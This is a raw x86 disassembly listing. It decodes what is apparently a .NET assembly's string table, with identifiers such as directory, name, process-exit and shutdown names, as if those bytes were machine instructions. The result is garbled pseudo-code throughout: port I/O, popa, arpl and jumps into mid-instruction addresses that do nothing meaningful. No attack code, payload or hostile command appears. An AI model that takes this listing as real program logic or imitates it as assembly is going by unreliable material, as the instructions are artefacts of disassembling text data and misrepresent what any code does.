  4092b7:	ins    DWORD PTR es:[edi],dx
  4092b8:	gs ja  0x40932a
  4092bb:	jb     0x409328
  4092bd:	inc    esp
  4092be:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4092c5:	jns    0x4092c7
  4092c7:	addr16 gs je 0x40932a
  4092cb:	inc    esp
  4092cc:	gs jae 0x409332
  4092cf:	jb     0x40933a
  4092d1:	jo     0x409347
  4092d3:	outs   dx,DWORD PTR ds:[esi]
  4092d4:	jb     0x4092d6
  4092d6:	inc    ebx
  4092d7:	outs   dx,DWORD PTR ds:[esi]
  4092d8:	ins    DWORD PTR es:[edi],dx
  4092d9:	jo     0x40933c
  4092db:	jb     0x409342
  4092dd:	push   esp
  4092de:	outs   dx,DWORD PTR ds:[esi]
  4092df:	add    BYTE PTR [eax+0x61],dl
  4092e2:	je     0x40934c
  4092e4:	add    BYTE PTR [esi+0x72],al
  4092e7:	popa   
  4092e8:	ins    DWORD PTR es:[edi],dx
  4092e9:	gs ja  0x40935b
  4092ec:	jb     0x409359
  4092ee:	inc    esp
  4092ef:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4092f6:	jns    0x4092f8
  4092f8:	inc    esp
  4092f9:	gs jae 0x40935f
  4092fc:	jb     0x409367
  4092fe:	jo     0x409374
  409300:	outs   dx,DWORD PTR ds:[esi]
  409301:	jb     0x409303
  409303:	data16 jne 0x409372
  409306:	ins    BYTE PTR es:[edi],dx
  409307:	dec    esi
  409308:	popa   
  409309:	ins    DWORD PTR es:[edi],dx
  40930a:	add    BYTE PTR gs:[ecx+0x6e],ch
  40930e:	inc    edi
  40930f:	inc    ecx
  409310:	inc    ebx
  409311:	add    BYTE PTR [ecx+0x73],ch
  409314:	push   edx
  409315:	gs imul esi,DWORD PTR fs:[ebx+0x74],0x746f6f52
  40931e:	add    BYTE PTR [edx+0x65],dh
  409321:	imul   esi,DWORD PTR fs:[ebx+0x74],0x656d614e
  409329:	add    BYTE PTR [ebx+0x69],dh
  40932c:	ins    DWORD PTR es:[edi],dx
  40932d:	jo     0x40939b
  40932f:	gs dec esi
  409331:	popa   
  409332:	ins    DWORD PTR es:[edi],dx
  409333:	add    BYTE PTR gs:[edi+0x65],ah
  409337:	je     0x409398
  409339:	inc    esi
  40933a:	jne    0x4093a8
  40933c:	ins    BYTE PTR es:[edi],dx
  40933d:	dec    esi
  40933e:	popa   
  40933f:	ins    DWORD PTR es:[edi],dx
  409340:	add    BYTE PTR gs:[edi+0x65],ah
  409344:	je     0x4093a5
  409346:	dec    ecx
  409347:	outs   dx,BYTE PTR ds:[esi]
  409348:	inc    edi
  409349:	inc    ecx
  40934a:	inc    ebx
  40934b:	add    BYTE PTR [edi+0x65],ah
  40934e:	je     0x4093af
  409350:	dec    ecx
  409351:	jae    0x4093a5
  409353:	gs imul esi,DWORD PTR fs:[ebx+0x74],0x746f6f52
  40935c:	add    BYTE PTR [edi+0x65],ah
  40935f:	je     0x4093c0
  409361:	push   edx
  409362:	gs imul esi,DWORD PTR fs:[ebx+0x74],0x656d614e
  40936b:	add    BYTE PTR [edi+0x65],ah
  40936e:	je     0x4093cf
  409370:	push   ebx
  409371:	imul   ebp,DWORD PTR [ebp+0x70],0x614e656c
  409378:	ins    DWORD PTR es:[edi],dx
  409379:	add    BYTE PTR gs:[esi+0x75],al
  40937d:	ins    BYTE PTR es:[edi],dx
  40937e:	ins    BYTE PTR es:[edi],dx
  40937f:	dec    esi
  409380:	popa   
  409381:	ins    DWORD PTR es:[edi],dx
  409382:	add    BYTE PTR gs:[ecx+0x6e],cl
  409386:	inc    edi
  409387:	inc    ecx
  409388:	inc    ebx
  409389:	add    BYTE PTR [ebx+0x69],dl
  40938c:	ins    DWORD PTR es:[edi],dx
  40938d:	jo     0x4093fb
  40938f:	gs dec esi
  409391:	popa   
  409392:	ins    DWORD PTR es:[edi],dx
  409393:	add    BYTE PTR gs:[edi+0x76],bl
  409397:	imul   esi,DWORD PTR [edx+0x74],0x506c6175
  40939e:	popa   
  40939f:	je     0x409409
  4093a1:	add    BYTE PTR [edi+0x70],bl
  4093a4:	push   0x63697379
  4093a9:	popa   
  4093aa:	ins    BYTE PTR es:[edi],dx
  4093ab:	push   eax
  4093ac:	popa   
  4093ad:	je     0x409417
  4093af:	add    BYTE PTR [edi+0x64],bl
  4093b2:	gs jae 0x409429
  4093b5:	imul   ebp,DWORD PTR [esi+0x61],0x6e6f6974
  4093bc:	push   eax
  4093bd:	popa   
  4093be:	je     0x409428
  4093c0:	add    BYTE PTR [edi+0x6d],bl
  4093c3:	gs je  0x409427
  4093c6:	bound  esp,QWORD PTR [ecx+0x73]
  4093c9:	gs push eax
  4093cb:	popa   
  4093cc:	je     0x409436
  4093ce:	add    BYTE PTR [ebx+0x6c],al
  4093d1:	imul   esp,DWORD PTR [ebp+0x6e],0x69754274
  4093d8:	ins    BYTE PTR es:[edi],dx
  4093d9:	fs dec ebp
  4093db:	popa   
  4093dc:	outs   dx,BYTE PTR ds:[esi]
  4093dd:	popa   
  4093de:	addr16 gs jb 0x4093e2
  4093e2:	pop    edi
  4093e3:	arpl   WORD PTR [edx+0x6d],sp
  4093e6:	add    BYTE PTR [ebx+0x79],dl
  4093e9:	jae    0x40945f
  4093eb:	gs ins DWORD PTR es:[edi],dx
  4093ed:	cs inc ebx
  4093ef:	outs   dx,DWORD PTR ds:[esi]
  4093f0:	ins    DWORD PTR es:[edi],dx
  4093f1:	jo     0x409462
  4093f3:	outs   dx,BYTE PTR ds:[esi]
  4093f4:	outs   dx,BYTE PTR gs:[esi]
  4093f6:	je     0x409445
  4093f8:	outs   dx,DWORD PTR ds:[esi]
  4093f9:	fs gs ins BYTE PTR es:[edi],dx
  4093fc:	add    BYTE PTR [ecx+edi*2+0x70],dl
  409400:	gs inc esp
  409402:	gs jae 0x409468
  409405:	jb     0x409470
  409407:	jo     0x40947d
  409409:	imul   ebp,DWORD PTR [edi+0x6e],0x766f7250
  409410:	imul   esp,DWORD PTR [ebp+eiz*2+0x72],0x61745f00
  409418:	jb     0x409481
  40941a:	gs je  0x409463
  40941d:	jb     0x409480
  40941f:	ins    DWORD PTR es:[edi],dx
  409420:	gs ja  0x409492
  409423:	jb     0x409490
  409425:	push   eax
  409426:	jb     0x409497
  409428:	jbe    0x409493
  40942a:	fs gs jb 0x40942e
  40942e:	dec    ebp
  40942f:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  409436:	je     0x409466
  409438:	push   esi
  409439:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  409440:	jne    0x4094a6
  409442:	imul   ebp,DWORD PTR [edi+0x2e],0x69736544
  409449:	outs   dx,BYTE PTR ds:[si]
  40944b:	add    BYTE PTR [esi+0x73],dl
  40944e:	push   esp
  40944f:	popa   
  409450:	jb     0x4094b9
  409452:	gs je  0x40949b
  409455:	jb     0x4094b8
  409457:	ins    DWORD PTR es:[edi],dx
  409458:	gs ja  0x4094ca
  40945b:	jb     0x4094c8
  40945d:	push   eax
  40945e:	jb     0x4094cf
  409460:	jbe    0x4094cb
  409462:	fs gs jb 0x4094b9
  409466:	gs jb  0x4094df
  409469:	imul   esp,DWORD PTR [ebx+0x65],0x61745f00
  409470:	jb     0x4094d9
  409472:	gs je  0x4094bb
  409475:	jb     0x4094d8
  409477:	ins    DWORD PTR es:[edi],dx
  409478:	gs ja  0x4094ea
  40947b:	jb     0x4094e8
  40947d:	push   eax
  40947e:	jb     0x4094ef
  409480:	jbe    0x4094eb
  409482:	fs gs jb 0x4094d9
  409486:	gs jb  0x4094ff
  409489:	imul   esp,DWORD PTR [ebx+0x65],0x756d5f00
  409490:	ins    BYTE PTR es:[edi],dx
  409491:	je     0x4094fc
  409493:	je     0x4094f6
  409495:	jb     0x4094fe
  409497:	gs je  0x409503
  40949a:	outs   dx,BYTE PTR ds:[esi]
  40949b:	addr16 push eax
  40949d:	jb     0x40950e
  40949f:	jbe    0x40950a
  4094a1:	fs gs jb 0x4094a5
  4094a5:	pop    edi
  4094a6:	jne    0x40951b
  4094a8:	gs push esi
  4094aa:	imul   esi,DWORD PTR [edx+0x74],0x506c6175
  4094b1:	popa   
  4094b2:	je     0x40951c
  4094b4:	push   eax
  4094b5:	jb     0x409526
  4094b7:	jbe    0x409522
  4094b9:	fs gs jb 0x4094bd
  4094bd:	pop    edi
  4094be:	jae    0x409530
  4094c0:	outs   dx,DWORD PTR ds:[esi]
  4094c1:	outs   dx,BYTE PTR ds:[esi]
  4094c2:	jae    0x409533
  4094c4:	jb     0x4094c6
  4094c6:	dec    ebp
  4094c7:	popa   
  4094c8:	outs   dx,BYTE PTR ds:[esi]
  4094c9:	jne    0x40952c
  4094cb:	ins    BYTE PTR es:[edi],dx
  4094cc:	push   edx
  4094cd:	gs jae 0x409535
  4094d0:	je     0x409517
  4094d2:	jbe    0x409539
  4094d4:	outs   dx,BYTE PTR ds:[esi]
  4094d5:	je     0x4094d7
  4094d7:	pop    edi
  4094d8:	popa   
  4094d9:	jo     0x40954b
  4094db:	inc    esp
  4094dc:	outs   dx,DWORD PTR ds:[esi]
  4094dd:	ins    DWORD PTR es:[edi],dx
  4094de:	popa   
  4094df:	imul   ebp,DWORD PTR [esi+0x52],0x74657365
  4094e6:	inc    ebp
  4094e7:	jbe    0x40954e
  4094e9:	outs   dx,BYTE PTR ds:[esi]
  4094ea:	je     0x4094ec
  4094ec:	addr16 gs je 0x40954f
  4094f0:	push   ebx
  4094f1:	push   0x6f647475
  4094f6:	ja     0x409566
  4094f8:	push   eax
  4094f9:	jb     0x40956a
  4094fb:	arpl   WORD PTR [ebp+0x73],sp
  4094fe:	jae    0x409500
  409500:	jae    0x409567
  409502:	je     0x409563
  409504:	push   ebx
  409505:	push   0x6f647475
  40950a:	ja     0x40957a
  40950c:	push   eax
  40950d:	jb     0x40957e
  40950f:	arpl   WORD PTR [ebp+0x73],sp
  409512:	jae    0x409514
  409514:	inc    ebx
  409515:	outs   dx,DWORD PTR ds:[esi]
  409516:	outs   dx,BYTE PTR ds:[esi]
  409517:	imul   sp,WORD PTR [edi+0x75],0x6572
  40951d:	inc    ebx
  40951e:	popa   
  40951f:	ins    BYTE PTR es:[edi],dx
  409520:	ins    BYTE PTR es:[edi],dx
  409521:	bound  esp,QWORD PTR [ecx+0x63]
  409524:	imul   ecx,DWORD PTR [ecx+ebp*2+0x66],0x65
  409529:	je     0x409594
  40952b:	ins    DWORD PTR es:[edi],dx
  40952c:	add    BYTE PTR gs:[ecx+ebp*2+0x73],al
  409531:	jo     0x4095a2
  409533:	jae    0x40959a
  409535:	add    BYTE PTR [ecx+0x73],cl
  409538:	dec    eax
  409539:	outs   dx,DWORD PTR ds:[esi]
  40953a:	jae    0x4095b0
  40953c:	inc    ebx
  40953d:	jb     0x4095a4
  40953f:	popa   
  409540:	je     0x4095a7
  409542:	add    BYTE PTR fs:[ebp+0x6e],dl
  409546:	ins    BYTE PTR es:[edi],dx
  409547:	outs   dx,DWORD PTR ds:[esi]
  409548:	popa   
  409549:	fs inc ecx
  40954b:	jo     0x4095bd
  40954d:	inc    esp
  40954e:	outs   dx,DWORD PTR ds:[esi]
  40954f:	ins    DWORD PTR es:[edi],dx
  409550:	popa   
  409551:	imul   ebp,DWORD PTR [esi+0x0],0x43746547
  409558:	outs   dx,DWORD PTR ds:[esi]
  409559:	fs gs inc edi
  40955c:	outs   dx,BYTE PTR gs:[esi]
  40955e:	inc    esp
  40955f:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  409566:	jns    0x409568
  409568:	inc    ebx
  409569:	outs   dx,DWORD PTR ds:[esi]
  40956a:	ins    DWORD PTR es:[edi],dx
  40956b:	jo     0x4095d6
  40956d:	ins    BYTE PTR es:[edi],dx
  40956e:	gs jb  0x4095c1
  409571:	popa   
  409572:	jb     0x4095d5
  409574:	ins    DWORD PTR es:[edi],dx
  409575:	gs je  0x4095dd
  409578:	jb     0x4095ed
  40957a:	add    BYTE PTR [edi+0x65],al
  40957d:	je     0x4095c2
  40957f:	outs   dx,DWORD PTR ds:[esi]
  409580:	fs gs inc esp
  409583:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40958a:	jns    0x4095d5
  40958c:	outs   dx,BYTE PTR ds:[esi]
  40958d:	outs   dx,WORD PTR ds:[esi]
  40958f:	jb     0x4095fe
  409591:	popa   
  409592:	je     0x4095fd
  409594:	outs   dx,DWORD PTR ds:[esi]
  409595:	outs   dx,BYTE PTR ds:[esi]
  409596:	add    BYTE PTR [edi+0x65],al
  409599:	je     0x4095de
  40959b:	outs   dx,DWORD PTR ds:[esi]
  40959c:	ins    DWORD PTR es:[edi],dx
  40959d:	jo     0x409608
  40959f:	ins    BYTE PTR es:[edi],dx
  4095a0:	gs jb  0x4095f3
  4095a3:	popa   
  4095a4:	jb     0x409607
  4095a6:	ins    DWORD PTR es:[edi],dx
  4095a7:	jae    0x4095a9
  4095a9:	inc    ebx
  4095aa:	inc    edx
  4095ab:	dec    ebp
  4095ac:	push   ebx
  4095ad:	gs jb  0x409626
  4095b0:	imul   esp,DWORD PTR [ebx+0x65],0x656e694c
  4095b7:	push   eax
  4095b8:	jb     0x40961b
  4095ba:	ins    DWORD PTR es:[di],dx
  4095bc:	popa   
  4095bd:	add    BYTE PTR [edi+0x65],al
  4095c0:	outs   dx,BYTE PTR ds:[esi]
  4095c1:	gs jb  0x409625
  4095c4:	je     0x40962b
  4095c6:	inc    ebx
  4095c7:	outs   dx,DWORD PTR ds:[esi]
  4095c8:	fs add BYTE PTR gs:[edi+0x65],al
  4095cd:	je     0x409623
  4095cf:	outs   dx,DWORD PTR ds:[esi]
  4095d0:	jo     0x40961e
  4095d2:	gs jbe 0x40963a
  4095d5:	ins    BYTE PTR es:[edi],dx
  4095d6:	inc    ecx
  4095d7:	jae    0x40964c
  4095d9:	gs ins DWORD PTR es:[edi],dx
  4095db:	bound  ebp,QWORD PTR [ecx+edi*2+0x52]
  4095df:	gs data16 gs jb 0x409649
  4095e4:	outs   dx,BYTE PTR ds:[esi]
  4095e5:	arpl   WORD PTR [ebp+0x73],sp
  4095e8:	add    BYTE PTR [edi+0x65],al
  4095eb:	je     0x409643
  4095ed:	imul   esi,DWORD PTR [edx+0x74],0x436c6175
  4095f4:	outs   dx,DWORD PTR ds:[esi]
  4095f5:	fs gs inc esp
  4095f8:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4095ff:	imul   esp,DWORD PTR [ebp+0x73],0x43734900
  409606:	outs   dx,DWORD PTR ds:[esi]
  409607:	fs gs inc ecx
  40960a:	jae    0x40967f
  40960c:	gs ins DWORD PTR es:[edi],dx
  40960e:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  409612:	inc    edi
  409613:	gs je  0x40965d
  409616:	outs   dx,BYTE PTR gs:[esi]
  409618:	gs jb  0x40967c
  40961b:	je     0x409682
  40961d:	fs push ebx
  40961f:	outs   dx,DWORD PTR ds:[esi]
  409620:	jne    0x409694
  409622:	arpl   WORD PTR [ebp+0x46],sp
  409625:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47746547
  40962d:	outs   dx,BYTE PTR gs:[esi]
  40962f:	gs jb  0x409693
  409632:	je     0x409699
  409634:	fs inc esi
  409636:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x75747269
  40963e:	popa   
  40963f:	ins    BYTE PTR es:[edi],dx
  409640:	push   eax
  409641:	popa   
  409642:	je     0x4096ac
  409644:	add    BYTE PTR [ebx+0x42],al
  409647:	dec    ebp
  409648:	push   ebx
  409649:	gs jb  0x4096c2
  40964c:	imul   esp,DWORD PTR [ebx+0x65],0x776f7242
  409653:	jae    0x4096ba
  409655:	jb     0x40969b
  409657:	imul   bp,WORD PTR gs:[esi+0x69],0x6974
  40965e:	outs   dx,DWORD PTR ds:[esi]
  40965f:	outs   dx,BYTE PTR ds:[esi]
  409660:	add    BYTE PTR [edi+0x65],al
  409663:	je     0x4096a7
  409665:	jb     0x4096d6
  409667:	ja     0x4096dc
  409669:	gs jb  0x4096b0
  40966c:	imul   bp,WORD PTR gs:[esi+0x69],0x6974
  409673:	outs   dx,DWORD PTR ds:[esi]
  409674:	outs   dx,BYTE PTR ds:[esi]
  409675:	jae    0x409677
  409677:	inc    ebp
  409678:	js     0x4096df
  40967a:	arpl   WORD PTR [ebp+0x74],si
  40967d:	gs push edi
  40967f:	outs   dx,DWORD PTR ds:[esi]
  409680:	jb     0x4096ed
  409682:	dec    ecx
  409683:	je     0x4096ea
  409685:	ins    DWORD PTR es:[edi],dx
  409686:	add    BYTE PTR [ebp+0x78],al
  409689:	arpl   WORD PTR gs:[ebp+0x74],si
  40968d:	gs push edi
  40968f:	outs   dx,DWORD PTR ds:[esi]
  409690:	jb     0x4096fd
  409692:	dec    ecx
  409693:	je     0x4096fa
  409695:	ins    DWORD PTR es:[edi],dx
  409696:	dec    ecx
  409697:	outs   dx,BYTE PTR ds:[esi]
  409698:	je     0x4096ff
  40969a:	jb     0x40970a
  40969c:	popa   
  40969d:	ins    BYTE PTR es:[edi],dx
  40969e:	add    BYTE PTR [eax+0x72],dl
  4096a1:	arpl   WORD PTR gs:[edi+0x6d],bp
  4096a5:	jo     0x409710
  4096a7:	ins    BYTE PTR es:[edi],dx
  4096a8:	gs inc ecx
  4096aa:	jo     0x40971c
  4096ac:	ins    BYTE PTR es:[edi],dx
  4096ad:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4096b4:	add    BYTE PTR [ebx+0x6f],al
  4096b7:	ins    DWORD PTR es:[edi],dx
  4096b8:	jo     0x409723
  4096ba:	ins    BYTE PTR es:[edi],dx
  4096bb:	gs inc esi
  4096bd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x74756853
  4096c5:	outs   dx,DWORD PTR fs:[esi]
  4096c7:	ja     0x409737
  4096c9:	add    BYTE PTR [ebx+0x68],dl
  4096cc:	jne    0x409742
  4096ce:	outs   dx,DWORD PTR fs:[esi]
  4096d0:	ja     0x409740
  4096d2:	dec    eax
  4096d3:	outs   dx,DWORD PTR ds:[esi]
  4096d4:	jae    0x40974a
  4096d6:	push   eax
  4096d7:	jb     0x409748
  4096d9:	arpl   WORD PTR [ebp+0x73],sp
  4096dc:	jae    0x4096de
  4096de:	push   eax
  4096df:	jb     0x409750
  4096e1:	arpl   WORD PTR [ebp+0x73],sp
  4096e4:	jae    0x40972b
  4096e6:	js     0x40974b
  4096e8:	gs jo  0x40975f
  4096eb:	imul   ebp,DWORD PTR [edi+0x6e],0x566f4400
  4096f2:	popa   
  4096f3:	ins    BYTE PTR es:[edi],dx
  4096f4:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e6f69
  4096fc:	inc    ebp
  4096fd:	outs   dx,BYTE PTR ds:[esi]
  4096fe:	jae    0x409775
  409700:	jb     0x409767
  409702:	dec    ebp
  409703:	jne    0x409771
  409705:	je     0x409770
  409707:	je     0x40976a
  409709:	jb     0x409772
  40970b:	gs je  0x409777
  40970e:	outs   dx,BYTE PTR ds:[esi]
  40970f:	addr16 push eax
  409711:	jb     0x409782
  409713:	jbe    0x40977e
  409715:	fs gs jb 0x409762
  409719:	outs   dx,BYTE PTR ds:[esi]
  40971a:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  409722:	add    BYTE PTR fs:[ebp+0x76],al
  409726:	outs   dx,BYTE PTR gs:[esi]
  409728:	je     0x40976b
  40972a:	jb     0x409793
  40972c:	jae    0x40972e
  40972e:	dec    edi
  40972f:	outs   dx,BYTE PTR ds:[esi]
  409730:	inc    ecx
  409731:	jo     0x4097a3
  409733:	inc    esp
  409734:	outs   dx,DWORD PTR ds:[esi]
  409735:	ins    DWORD PTR es:[edi],dx
  409736:	popa   
  409737:	imul   ebp,DWORD PTR [esi+0x53],0x74726174
  40973e:	gs add BYTE PTR fs:[edx+0x75],al
  409743:	imul   ebp,DWORD PTR [esp+eiz*2+0x4d],0x67616e61
  40974b:	gs jb  0x409796
  40974e:	outs   dx,DWORD PTR ds:[esi]
  40974f:	jae    0x4097c5
  409751:	push   ebp
  409752:	outs   dx,BYTE PTR ds:[esi]
  409753:	ins    BYTE PTR es:[edi],dx
  409754:	outs   dx,DWORD PTR ds:[esi]
  409755:	popa   
  409756:	fs inc ebp
  409758:	jbe    0x4097bf
  40975a:	outs   dx,BYTE PTR ds:[esi]
  40975b:	je     0x40979e
  40975d:	jb     0x4097c6
  40975f:	jae    0x409761
  409761:	dec    edi
  409762:	outs   dx,BYTE PTR ds:[esi]
  409763:	inc    ecx
  409764:	jo     0x4097d6
  409766:	inc    esp
  409767:	outs   dx,DWORD PTR ds:[esi]
  409768:	ins    DWORD PTR es:[edi],dx
  409769:	popa   
  40976a:	imul   ebp,DWORD PTR [esi+0x55],0x616f6c6e
  409771:	fs gs add BYTE PTR fs:[edi+0x6e],cl
  409777:	inc    ecx
  409778:	jo     0x4097ea
  40977a:	inc    esp
  40977b:	outs   dx,DWORD PTR ds:[esi]
  40977c:	ins    DWORD PTR es:[edi],dx
  40977d:	popa   
  40977e:	imul   ebp,DWORD PTR [esi+0x53],0x64747568
  409785:	outs   dx,DWORD PTR ds:[esi]
  409786:	ja     0x4097f6
  409788:	add    BYTE PTR [ebx+edx*2],bh
  40978b:	push   0x6f647475
  409790:	ja     0x409800
  409792:	push   eax
  409793:	jb     0x409804
  409795:	arpl   WORD PTR [ebp+0x73],sp
  409798:	jae    0x4097d8
  40979a:	imul   ebx,DWORD PTR [edi+0x5f],0x42
  40979e:	popa   
  40979f:	arpl   WORD PTR [ebx+0x69],bp
  4097a2:	outs   dx,BYTE PTR ds:[esi]
  4097a3:	addr16 inc esi
  4097a5:	imul   esp,DWORD PTR [ebp+0x6c],0x68530064
  4097ac:	jne    0x409822
  4097ae:	outs   dx,DWORD PTR fs:[esi]
  4097b0:	ja     0x409820
  4097b2:	push   eax
  4097b3:	jb     0x409824
  4097b5:	arpl   WORD PTR [ebp+0x73],sp
  4097b8:	jae    0x4097ba
  4097ba:	dec    ecx
  4097bb:	push   edx
  4097bc:	gs ins DWORD PTR es:[edi],dx
  4097be:	outs   dx,DWORD PTR ds:[esi]
  4097bf:	je     0x409826
  4097c1:	inc    ebx
  4097c2:	inc    edx
  4097c3:	dec    ebp
  4097c4:	push   ebx
  4097c5:	gs jb  0x40983e
  4097c8:	imul   esp,DWORD PTR [ebx+0x65],0x6c6c6143
  4097cf:	bound  esp,QWORD PTR [ecx+0x63]
  4097d2:	imul   eax,DWORD PTR [eax],0x5f
  4097d5:	arpl   WORD PTR [edx+0x6d],sp
  4097d8:	inc    ebx
  4097d9:	popa   
  4097da:	ins    BYTE PTR es:[edi],dx
  4097db:	ins    BYTE PTR es:[edi],dx
  4097dc:	bound  esp,QWORD PTR [ecx+0x63]
  4097df:	imul   eax,DWORD PTR [eax],0x41
  4097e2:	jo     0x409854
  4097e4:	inc    esp
  4097e5:	outs   dx,DWORD PTR ds:[esi]
  4097e6:	ins    DWORD PTR es:[edi],dx
  4097e7:	popa   
  4097e8:	imul   ebp,DWORD PTR [esi+0x53],0x64747568
  4097ef:	outs   dx,DWORD PTR ds:[esi]
  4097f0:	ja     0x409860
  4097f2:	push   edx
  4097f3:	gs popa 
  4097f5:	jae    0x409866
  4097f7:	outs   dx,BYTE PTR ds:[esi]
  4097f8:	add    BYTE PTR [esi+0x61],dl
  4097fb:	ins    BYTE PTR es:[edi],dx
  4097fc:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x456e6f69
  409804:	jb     0x409878
  409806:	outs   dx,DWORD PTR ds:[esi]
  409807:	jb     0x40985d
  409809:	jns    0x40987b
  40980b:	add    BYTE PTR gs:[edx+0x65],dl
  40980f:	jo     0x409880
  409811:	jb     0x409887
  409813:	inc    ebx
  409814:	outs   dx,DWORD PTR ds:[esi]
  409815:	ins    DWORD PTR es:[edi],dx
  409816:	jo     0x409881
  409818:	ins    BYTE PTR es:[edi],dx
  409819:	popa   
  40981a:	je     0x409885
  40981c:	outs   dx,DWORD PTR ds:[esi]
  40981d:	outs   dx,BYTE PTR ds:[esi]
  40981e:	inc    ebp
  40981f:	jb     0x409893
  409821:	outs   dx,DWORD PTR ds:[esi]
  409822:	jb     0x409824
  409824:	push   edx
  409825:	gs jo  0x409897
  409828:	jb     0x40989e
  40982a:	inc    ebx
  40982b:	outs   dx,DWORD PTR ds:[esi]
  40982c:	ins    DWORD PTR es:[edi],dx
  40982d:	jo     0x409898
  40982f:	ins    BYTE PTR es:[edi],dx
  409830:	popa   
  409831:	je     0x40989c
  409833:	outs   dx,DWORD PTR ds:[esi]
  409834:	outs   dx,BYTE PTR ds:[esi]
  409835:	dec    ebp
  409836:	gs jae 0x4098ac
  409839:	popa   
  40983a:	add    BYTE PTR gs:[bx+0x65],al
  40983f:	je     0x409882
  409841:	jae    0x4098b6
  409843:	gs ins DWORD PTR es:[edi],dx
  409845:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  409849:	popa   
  40984a:	je     0x4098b4
  40984c:	inc    esi
  40984d:	outs   dx,DWORD PTR ds:[esi]
  40984e:	jb     0x40989e
  409850:	popa   
  409851:	ins    DWORD PTR es:[edi],dx
  409852:	add    BYTE PTR gs:[esi+0x69],dl
  409856:	jb     0x4098cc
  409858:	jne    0x4098bb
  40985a:	ins    BYTE PTR es:[edi],dx
  40985b:	push   eax
  40985c:	popa   
  40985d:	je     0x4098c7
  40985f:	dec    ecx
  409860:	je     0x4098c7
  409862:	ins    DWORD PTR es:[edi],dx
  409863:	dec    ecx
  409864:	outs   dx,BYTE PTR ds:[esi]
  409865:	outs   dx,WORD PTR ds:[esi]
  409867:	add    BYTE PTR [edi+0x65],al
  40986a:	je     0x4098c2
  40986c:	imul   esi,DWORD PTR [edx+0x74],0x506c6175
  409873:	popa   
  409874:	je     0x4098de
  409876:	dec    ecx
  409877:	je     0x4098de
  409879:	ins    DWORD PTR es:[edi],dx
  40987a:	dec    ecx
  40987b:	outs   dx,BYTE PTR ds:[esi]
  40987c:	outs   dx,WORD PTR ds:[esi]
  40987e:	add    BYTE PTR [ebp+0x6e],al
  409881:	jae    0x4098f8
  409883:	jb     0x4098ea
  409885:	inc    ecx
  409886:	bound  esi,QWORD PTR [ebx+0x6f]
  409889:	ins    BYTE PTR es:[edi],dx
  40988a:	jne    0x409900
  40988c:	gs push eax
  40988e:	popa   
  40988f:	je     0x4098f9
  409891:	add    BYTE PTR [ecx+ebp*2+0x73],cl
  409895:	je     0x4098f7
  409897:	xor    DWORD PTR [eax],eax
  409899:	inc    ebx
  40989a:	push   0x49646c69
  40989f:	je     0x409906
  4098a1:	ins    DWORD PTR es:[edi],dx
  4098a2:	push   esp
  4098a3:	jns    0x409915
  4098a5:	add    BYTE PTR gs:[edi+0x65],al
  4098a9:	je     0x4098ee
  4098ab:	push   0x49646c69
  4098b0:	je     0x409917
  4098b2:	ins    DWORD PTR es:[edi],dx
  4098b3:	jae    0x4098b5
  4098b5:	inc    ecx
  4098b6:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  4098ba:	outs   dx,BYTE PTR ds:[esi]
  4098bb:	add    BYTE PTR [edi+ebp*2+0x4f],al
  4098bf:	outs   dx,BYTE PTR ds:[esi]
  4098c0:	gs push edi
  4098c2:	popa   
  4098c3:	jns    0x409908
  4098c5:	popa   
  4098c6:	ins    BYTE PTR es:[edi],dx
  4098c7:	ins    BYTE PTR es:[edi],dx
  4098c8:	bound  esp,QWORD PTR [ecx+0x63]
  4098cb:	imul   eax,DWORD PTR [eax],0x44
  4098ce:	outs   dx,DWORD PTR ds:[esi]
  4098cf:	push   esp
  4098d0:	ja     0x409941
  4098d2:	push   edi
  4098d3:	popa   
  4098d4:	jns    0x409919
  4098d6:	popa   
  4098d7:	ins    BYTE PTR es:[edi],dx
  4098d8:	ins    BYTE PTR es:[edi],dx
  4098d9:	bound  esp,QWORD PTR [ecx+0x63]
  4098dc:	imul   eax,DWORD PTR [eax],0x52
  4098df:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x5f007265
  4098e8:	arpl   WORD PTR [ecx+0x6c],sp
  4098eb:	ins    BYTE PTR es:[edi],dx
  4098ec:	bound  esp,QWORD PTR [ecx+0x63]
  4098ef:	imul   eax,DWORD PTR [eax],0x5f
  4098f2:	popa   
  4098f3:	jae    0x409968
  4098f5:	gs ins DWORD PTR es:[edi],dx
  4098f7:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  4098fb:	imul   esi,DWORD PTR [edx+0x0],0x696c635f
  409902:	outs   dx,BYTE PTR gs:[esi]
  409904:	je     0x40995c
  409906:	imul   esi,DWORD PTR [edx+0x74],0x466c6175
  40990d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  409915:	push   edx
  409916:	gs jae 0x409988
  409919:	ins    BYTE PTR es:[edi],dx
  40991a:	jbe    0x409981
  40991c:	inc    ebp
  40991d:	jbe    0x409984
  40991f:	outs   dx,BYTE PTR ds:[esi]
  409920:	je     0x409963
  409922:	jb     0x40998b
  409924:	jae    0x409926
  409926:	dec    edi
  409927:	outs   dx,BYTE PTR ds:[esi]
  409928:	inc    ecx
  409929:	jae    0x40999e
  40992b:	gs ins DWORD PTR es:[edi],dx
  40992d:	bound  ebp,QWORD PTR [ecx+edi*2+0x52]
  409931:	gs jae 0x4099a3
  409934:	ins    BYTE PTR es:[edi],dx
  409935:	jbe    0x40999c
  409937:	add    BYTE PTR [ecx+0x73],cl
  40993a:	inc    ebx
  40993b:	ins    BYTE PTR es:[edi],dx
  40993c:	imul   esp,DWORD PTR [ebp+0x6e],0x72695674
  409943:	je     0x4099ba
  409945:	popa   
  409946:	ins    BYTE PTR es:[edi],dx
  409947:	inc    esi
